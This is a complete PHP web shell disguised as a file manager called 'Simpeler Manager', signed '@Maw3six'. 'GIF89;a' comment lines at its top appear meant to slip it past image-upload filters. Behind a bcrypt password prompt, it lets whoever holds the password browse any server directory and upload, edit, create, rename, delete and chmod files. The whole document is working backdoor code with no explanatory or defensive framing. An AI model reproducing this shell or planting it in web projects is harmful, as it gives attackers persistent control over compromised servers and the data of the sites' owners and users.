<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

function show_login_page($message = "Hello Friends")
{
?>
    <!doctype html>
<html lang=id>
<head>
<meta charset=UTF-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<style>body{background-color:#000;color:#fff;font-family:'Courier New',Courier,monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.login-container{text-align:center}.login-container input{background-color:#000}</style>
</head>
<body>
<div class=login-container>
<h1>@Maw3six</h1>
<form action="" method=post>
<div align=center>
<input type=password name=pass placeholder=&nbsp;Password>
</div>
</form>
</div>
</body>
</html>

<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$12$VPJy6kC1L6EIVQaZWHzVTOEQ1AEe7sIhrRBVSEzsjz1DyEnriBcvW';

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->

<?php

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : './';
$current_dir = realpath($current_dir) . DIRECTORY_SEPARATOR;
$parent_dir = dirname($current_dir);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'upload':
                if (isset($_FILES['file'])) {
                    $target = $current_dir . basename($_FILES['file']['name']);
                    move_uploaded_file($_FILES['file']['tmp_name'], $target);
                }
                break;
            
            case 'rename':
                if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                    rename($current_dir . $_POST['oldname'], $current_dir . $_POST['newname']);
                }
                break;
            
            case 'delete':
                if (isset($_POST['filename'])) {
                    $path = $current_dir . $_POST['filename'];
                    is_dir($path) ? rmdir($path) : unlink($path);
                }
                break;
            
            case 'chmod':
                if (isset($_POST['filename']) && isset($_POST['permission'])) {
                    chmod($current_dir . $_POST['filename'], octdec($_POST['permission']));
                }
                break;

            case 'mkdir':
                if (isset($_POST['dirname'])) {
                    mkdir($current_dir . $_POST['dirname']);
                }
                break;

            case 'edit':
                if (isset($_POST['filename']) && isset($_POST['content'])) {
                    file_put_contents($current_dir . $_POST['filename'], $_POST['content']);
                }
                break;
        case 'create_file': 
                if (isset($_POST['filename'])) {
                    $new_file = $current_dir . $_POST['filename'];
                    if (!file_exists($new_file)) {
                        file_put_contents($new_file, "");
                    }
                }
                break;
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
    exit;
}

$edit_mode = false;
$edit_content = '';
$edit_file = '';
if (isset($_GET['edit'])) {
    $edit_mode = true;
    $edit_file = $_GET['edit'];
    $edit_content = file_get_contents($current_dir . $edit_file);
}
?>
<!doctype html>
<html>
<head>
<title>Simpeler Manager @maw3six</title>
<style>body{font-family:Inter,sans-serif;margin:20px;background:linear-gradient(to bottom,#fff,#000);color:#333}.container{width:1240px;margin:0 auto;padding:20px;background:linear-gradient(to bottom,#000,#fff);border-radius:10px;box-shadow:0 4px 8px rgba(0,0,0,.2)}table{width:100%;border-collapse:collapse;margin-top:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.05);border-radius:8px;overflow:hidden}h1,h2,h3{color:#fff}td,th{padding:12px;text-align:left;border-bottom:1px solid #ddd}th{background-color:#f1f3f5;font-weight:600}tr:hover{background-color:#f9fafb}.actions{display:flex;gap:10px}.form-container{display:flex;gap:15px;justify-content:flex-start;flex-wrap:wrap}.create-file-form,.mkdir-form,.upload-form{flex:1;min-width:250px;text-align:center}.create-file-form input,.mkdir-form input,.upload-form input{width:30%;padding:8px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px}.create-file-form button,.mkdir-form button,.upload-form button{width:30%;padding:8px;background-color:#171818;color:#fff;border:none;border-radius:5px;cursor:pointer}.create-file-form button:hover,.mkdir-form button:hover,.upload-form button:hover{background-color:#71002b}button{padding:8px 12px;border:none;border-radius:5px;cursor:pointer;font-size:14px;transition:.3s;background-color:#171818;color:#fff}button:hover{background-color:#71002b}.current-path{background:#eef2f7;padding:12px;margin:10px 0;border-radius:5px;font-weight:500}.folder{color:#060606;font-weight:600;cursor:pointer}.folder:hover{text-decoration:underline}.edit-area{width:100%;height:400px;margin:20px 0;padding:10px;border:1px solid #ddd;border-radius:5px;background:#fff;font-family:monospace;font-size:14px;outline:0;box-shadow:inset 0 1px 3px rgba(0,0,0,.1)}.controls{display:flex;gap:10px;margin:10px 0}.footer{background:linear-gradient(to right,#000,#333);color:#fff;text-align:center;padding:20px;font-family:Arial,sans-serif;margin-top:40px}</style>
</head>
<body></body></html>
<div class="container">
    <h2>
    <a href="<?php echo basename(__FILE__); ?>" style="text-decoration: none; color: inherit;">
        Simpeler Manager
    </a>
	</h2>

    <?php if ($edit_mode): ?>
        <div class="edit-mode">
            <h3>Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($edit_file); ?>">
                <textarea name="content" class="edit-area"><?php echo htmlspecialchars($edit_content); ?></textarea>
                <div class="controls">
                    <button type="submit">Save</button>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>"><button type="button">Cancel</button></a>
                </div>
            </form>
        </div>
    <?php else: ?>
        <div class="form-container">
    <form class="upload-form" method="POST" enctype="multipart/form-data">
        <h3>Upload File</h3>
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>

    <form class="mkdir-form" method="POST">
        <h3>Create Folder</h3>
        <input type="hidden" name="action" value="mkdir">
        <input type="text" name="dirname" placeholder="Folder Name" required>
        <button type="submit">Create</button>
    </form>

    <form class="create-file-form" method="POST">
        <h3>Create File</h3>
        <input type="hidden" name="action" value="create_file">
        <input type="text" name="filename" placeholder="e.g., file.txt" required>
        <button type="submit">Create</button>
    </form>
</div>


        <div class="current-path">
            Current Location: <?php echo htmlspecialchars($current_dir); ?>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($current_dir != './'): ?>
                    <tr class="folder-row">
                        <td colspan="5">
                            <a href="?dir=<?php echo urlencode($parent_dir); ?>" class="folder">📁 .....</a>
                        </td>
                    </tr>
                <?php endif; ?>

                <?php
                $files = scandir($current_dir);
                $folders = [];
                $regular_files = [];

                foreach ($files as $file) {
                    if ($file != "." && $file != "..") {
                        $filepath = $current_dir . $file;
                        if (is_dir($filepath)) {
                            $folders[] = $file;
                        } else {
                            $regular_files[] = $file;
                        }
                    }
                }

                sort($folders);
                sort($regular_files);

                foreach ($folders as $folder) {
                    $filepath = $current_dir . $folder;
                    ?>
                    <tr class="folder-row">
                        <td>
                            <a href="?dir=<?php echo urlencode($filepath); ?>" class="folder">
                                📁 <?php echo htmlspecialchars($folder); ?>
                            </a>
                        </td>
                        <td>Directory</td>
                        <td>-</td>
                        <td><?php echo substr(sprintf('%o', fileperms($filepath)), -4); ?></td>
                        <td class="actions">
                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="rename">
                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($folder); ?>">
                                <input type="text" name="newname" placeholder="New name" required>
                                <button type="submit">Rename</button>
                            </form>

                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="chmod">
                                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($folder); ?>">
                                <input type="text" name="permission" placeholder="777" pattern="[0-7]{3}" required>
                                <button type="submit">Chmod</button>
                            </form>

                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($folder); ?>">
                                <button type="submit" onclick="return confirm('Are you sure?')">Delete</button>
                            </form>
                        </td>
                    </tr>
                    <?php
                }

                foreach ($regular_files as $file) {
                    $filepath = $current_dir . $file;
                    ?>
                    <tr>
                        <td><?php echo htmlspecialchars($file); ?></td>
                        <td>File</td>
                        <td><?php echo filesize($filepath) . ' bytes'; ?></td>
                        <td><?php echo substr(sprintf('%o', fileperms($filepath)), -4); ?></td>
                        <td class="actions">
                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="rename">
                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($file); ?>">
                                <input type="text" name="newname" placeholder="New name" required>
                                <button type="submit">Rename</button>
                            </form>

                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="chmod">
                                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($file); ?>">
                                <input type="text" name="permission" placeholder="777" pattern="[0-7]{3}" required>
                                <button type="submit">Chmod</button>
                            </form>

                            <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($file); ?>">
                                <button type="button">Edit</button>
                            </a>

                            <form method="POST" style="display: inline;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($file); ?>">
                                <button type="submit" onclick="return confirm('Are you sure?')">Delete</button>
                            </form>
                        </td>
                    </tr>
                    <?php
                }
                ?>
            </tbody>
        </table>
		<footer class="footer">
		<p>"When you see a good move, look for a better one."</p>
		<p>🌐 "We live in a world where we have to hide to make love, while violence is practiced in broad daylight." 🌐</p>
		<p>@Maw3six &copy; 2025</p>
		</footer>

    <?php endif; ?>
	</div>
</body>
</html>
